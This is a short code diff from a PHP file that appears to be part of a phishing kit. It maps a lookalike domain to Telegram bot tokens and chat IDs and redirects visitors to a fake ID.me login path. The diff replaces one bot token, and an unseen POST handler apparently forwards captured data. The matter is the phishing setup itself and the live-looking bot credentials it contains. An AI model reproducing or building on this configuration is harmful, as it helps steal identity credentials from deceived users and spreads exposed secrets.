@@ -27,7 +27,7 @@ $site_map = [
     'crediblellc.info' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '8789303758:AAE6VNyi-6z8mJWbsCpLQbcNx_8tmTgnDsY', 'chat_id' => '5850580289']
+            ['token' => '8728991586:AAExYzi09TMjfvHx6l7EU6JGTjboXypLlQg', 'chat_id' => '5850580289']
         ],
         'redirect' => 'https://crediblellc.info/api.id.me/en/session/new.html'
     ],
@@ -1080,4 +1080,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     exit;
 }
 ?>
+
 
